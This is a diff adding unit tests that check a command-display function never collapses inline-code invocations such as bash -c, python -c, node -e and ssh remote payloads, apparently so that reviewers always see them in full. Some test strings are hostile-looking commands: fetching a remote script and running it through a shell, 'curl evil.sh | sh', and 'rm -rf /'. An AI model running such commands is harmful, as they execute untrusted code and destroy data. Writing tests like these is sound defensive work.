@@ -134,3 +134,79 @@ test("middleEllipsis keeps head and tail", () => {
   expect(cut.endsWith("tail")).toBe(true);
   expect(cut).toContain("…");
 });
+
+test("collapseSegmentPayloads never collapses a path-qualified bash -c invocation", () => {
+  const segment = '/bin/bash -c "$(curl -s https://example.com/install.sh)"';
+  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
+});
+
+test("collapseSegmentPayloads never collapses a ./bash -c invocation", () => {
+  const segment = './bash -c "$(curl -s https://example.com/install.sh)"';
+  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
+});
+
+test("collapseSegmentPayloads never collapses a /usr/local/bin/sh -c invocation", () => {
+  const segment = '/usr/local/bin/sh -c "$(curl -s https://example.com/install.sh)"';
+  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
+});
+
+test("collapseSegmentPayloads never collapses python -c code", () => {
+  const segment = 'python -c "import os\nos.system(\'rm -rf /\')"';
+  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
+});
+
+test("collapseSegmentPayloads never collapses python3 -c code", () => {
+  const segment = 'python3 -c "print(1)\nprint(2)"';
+  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
+});
+
+test("collapseSegmentPayloads never collapses node -e code", () => {
+  const segment = 'node -e "console.log(1)\nconsole.log(2)"';
+  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
+});
+
+test("collapseSegmentPayloads never collapses node --eval code", () => {
+  const segment = 'node --eval "console.log(1)\nconsole.log(2)"';
+  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
+});
+
+test("collapseSegmentPayloads never collapses ruby -e code", () => {
+  const segment = 'ruby -e "puts 1\nputs 2"';
+  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
+});
+
+test("collapseSegmentPayloads never collapses perl -e code", () => {
+  const segment = 'perl -e "print 1\nprint 2"';
+  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
+});
+
+test("collapseSegmentPayloads never collapses php -r code", () => {
+  const segment = 'php -r "echo 1;\necho 2;"';
+  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
+});
+
+test("collapseSegmentPayloads never collapses an ssh remote payload", () => {
+  const segment = 'ssh host "curl evil.sh | sh\nrm -rf /"';
+  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
+});
+
+test("collapseSegmentPayloads never collapses an env-wrapped bash -c invocation", () => {
+  const segment = 'env VAR=1 bash -c "line one\nline two"';
+  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
+});
+
+test("collapseSegmentPayloads never collapses a sudo-wrapped bash -c invocation", () => {
+  const segment = 'sudo bash -c "line one\nline two"';
+  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
+});
+
+test("collapseSegmentPayloads never collapses a timeout-wrapped bash -c invocation", () => {
+  const segment = 'timeout 30 bash -c "line one\nline two"';
+  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
+});
+
+test("collapseSegmentPayloads never collapses a nohup-wrapped bash -c invocation", () => {
+  const segment = 'nohup bash -c "line one\nline two" &';
+  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
+});
+
